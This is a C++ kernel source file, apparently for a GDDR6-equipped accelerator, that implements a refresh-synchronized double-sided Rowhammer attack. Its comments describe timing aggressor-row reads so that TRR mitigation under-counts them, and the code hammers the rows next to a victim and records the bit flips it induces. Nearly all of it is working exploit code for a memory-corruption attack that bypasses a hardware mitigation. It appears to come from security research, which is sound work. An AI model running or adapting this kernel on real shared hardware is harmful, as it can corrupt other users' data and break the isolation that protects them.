// SPDX-FileCopyrightText: © 2026
// SPDX-License-Identifier: Apache-2.0
//
// C1 — REF-synchronized double-sided hammer kernel.
//
// Rationale (from GPUHammer Step 3, BlackSmith S&P22, SMASH USENIX21):
// in-DRAM mitigations like TRR sample activations during specific windows
// around DRAM auto-refresh (REF) commands.  By inserting a calibrated delay
// inside the hammer loop body we can shift our activation pattern in time so
// that the REF window lands ON our delay (i.e. between activations) rather
// than ON an aggressor activation.  When the alignment is correct, TRR's
// sampler sees fewer of our activations → mitigation under-counts → flips.
//
// The delay is implemented as a runtime-sized "nop chain" using a small
// integer add loop.  We deliberately avoid `noc_async_*_barrier()` inside
// the loop because that would also serialize the activations.  Each loop
// iteration issues 2 reads (double-sided) + spins for `delay_iters` cheap
// integer ops.  At ~1 cycle per `add`, the calibration sweep covers
// 0..~2000 BRISC cycles per pair, which is well past tREFI on GDDR6.
//
// === Runtime arguments ===
//   arg 0:  dram_noc_x
//   arg 1:  dram_noc_y
//   arg 2:  victim_addr
//   arg 3:  hammer_iters       — pairs to issue (each = 2 activations + delay)
//   arg 4:  data_pattern
//   arg 5:  l1_scratch_addr
//   arg 6:  l1_result_addr
//   arg 7:  delay_iters        — per-loop delay (integer adds)

#include <cstdint>

constexpr uint32_t ROW_SIZE             = 8192;
constexpr uint32_t CACHELINE            = 64;
constexpr uint32_t CACHELINES_PER_ROW   = ROW_SIZE / CACHELINE;

constexpr uint32_t RESULT_HDR_WORDS     = 6;
constexpr uint32_t MAX_FLIP_RECORDS     = 32;
constexpr uint32_t FLIP_RECORD_WORDS    = 4;
constexpr uint32_t RESULT_BUF_WORDS     = RESULT_HDR_WORDS + MAX_FLIP_RECORDS * FLIP_RECORD_WORDS;

void kernel_main() {
    uint32_t dram_noc_x      = get_arg_val<uint32_t>(0);
    uint32_t dram_noc_y      = get_arg_val<uint32_t>(1);
    uint32_t victim_addr     = get_arg_val<uint32_t>(2);
    uint32_t hammer_iters    = get_arg_val<uint32_t>(3);
    uint32_t data_pattern    = get_arg_val<uint32_t>(4);
    uint32_t l1_scratch_addr = get_arg_val<uint32_t>(5);
    uint32_t l1_result_addr  = get_arg_val<uint32_t>(6);
    uint32_t delay_iters     = get_arg_val<uint32_t>(7);

    uint32_t aggressor_lo = victim_addr - ROW_SIZE;
    uint32_t aggressor_hi = victim_addr + ROW_SIZE;
    uint32_t scratch_a = l1_scratch_addr;
    uint32_t scratch_b = l1_scratch_addr + CACHELINE;

    volatile uint32_t* results = reinterpret_cast<volatile uint32_t*>(l1_result_addr);
    for (uint32_t i = 0; i < RESULT_BUF_WORDS; ++i) results[i] = 0;

    // Phase 1: write victim & aggressor patterns
    {
        volatile uint32_t* fill_a = reinterpret_cast<volatile uint32_t*>(scratch_a);
        volatile uint32_t* fill_b = reinterpret_cast<volatile uint32_t*>(scratch_b);
        uint32_t aggr_pattern = ~data_pattern;
        for (uint32_t w = 0; w < CACHELINE / sizeof(uint32_t); ++w) {
            fill_a[w] = data_pattern;
            fill_b[w] = aggr_pattern;
        }
        for (uint32_t cl = 0; cl < CACHELINES_PER_ROW; ++cl) {
            uint64_t v_dst = get_noc_addr(dram_noc_x, dram_noc_y, victim_addr     + cl * CACHELINE);
            uint64_t l_dst = get_noc_addr(dram_noc_x, dram_noc_y, aggressor_lo    + cl * CACHELINE);
            uint64_t h_dst = get_noc_addr(dram_noc_x, dram_noc_y, aggressor_hi    + cl * CACHELINE);
            noc_async_write(scratch_a, v_dst, CACHELINE);
            noc_async_write(scratch_b, l_dst, CACHELINE);
            noc_async_write(scratch_b, h_dst, CACHELINE);
        }
        noc_async_write_barrier();
    }

    uint64_t noc_lo = get_noc_addr(dram_noc_x, dram_noc_y, aggressor_lo);
    uint64_t noc_hi = get_noc_addr(dram_noc_x, dram_noc_y, aggressor_hi);

    // Phase 2: REF-synchronized hammer loop.
    volatile uint32_t lo0 = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_L);
    volatile uint32_t hi0 = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_H);
    uint64_t t_start = (static_cast<uint64_t>(hi0) << 32) | lo0;

    // `accumulator` is volatile so the compiler can't fold the delay loop
    // away.  This keeps the delay observable in the BRISC ELF disassembly
    // (B4 audit) and prevents a silent zero-delay regression.
    volatile uint32_t accumulator = 0;
    for (uint32_t i = 0; i < hammer_iters; ++i) {
        noc_async_read(noc_lo, scratch_a, CACHELINE);
        noc_async_read(noc_hi, scratch_b, CACHELINE);
        for (uint32_t d = 0; d < delay_iters; ++d) {
            accumulator += d;       // ~1 cycle per iter on BRISC
        }
    }
    noc_async_read_barrier();

    volatile uint32_t lo1 = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_L);
    volatile uint32_t hi1 = *reinterpret_cast<volatile uint32_t*>(RISCV_DEBUG_REG_WALL_CLOCK_H);
    uint64_t t_end = (static_cast<uint64_t>(hi1) << 32) | lo1;
    uint64_t elapsed = t_end - t_start;

    // Touch the accumulator so the delay loop is not optimized away even if
    // BRISC compiler decides volatile alone is insufficient.
    results[RESULT_BUF_WORDS - 1] = accumulator;

    // Phase 3: verify
    uint32_t num_flips = 0, total_bit_flips = 0, record_idx = 0;
    for (uint32_t cl = 0; cl < CACHELINES_PER_ROW; ++cl) {
        uint64_t v_noc = get_noc_addr(dram_noc_x, dram_noc_y, victim_addr + cl * CACHELINE);
        noc_async_read(v_noc, scratch_a, CACHELINE);
        noc_async_read_barrier();
        volatile uint32_t* rb = reinterpret_cast<volatile uint32_t*>(scratch_a);
        for (uint32_t w = 0; w < CACHELINE / sizeof(uint32_t); ++w) {
            uint32_t actual = rb[w];
            if (actual != data_pattern) {
                ++num_flips;
                uint32_t diff = actual ^ data_pattern;
                while (diff) { total_bit_flips += diff & 1u; diff >>= 1; }
                if (record_idx < MAX_FLIP_RECORDS) {
                    uint32_t base = RESULT_HDR_WORDS + record_idx * FLIP_RECORD_WORDS;
                    results[base + 0] = cl;
                    results[base + 1] = w;
                    results[base + 2] = data_pattern;
                    results[base + 3] = actual;
                    ++record_idx;
                }
            }
        }
    }

    results[0] = 0;
    results[1] = num_flips;
    results[2] = total_bit_flips;
    results[3] = static_cast<uint32_t>(elapsed);
    results[4] = static_cast<uint32_t>(elapsed >> 32);
    results[5] = hammer_iters * 2;
}
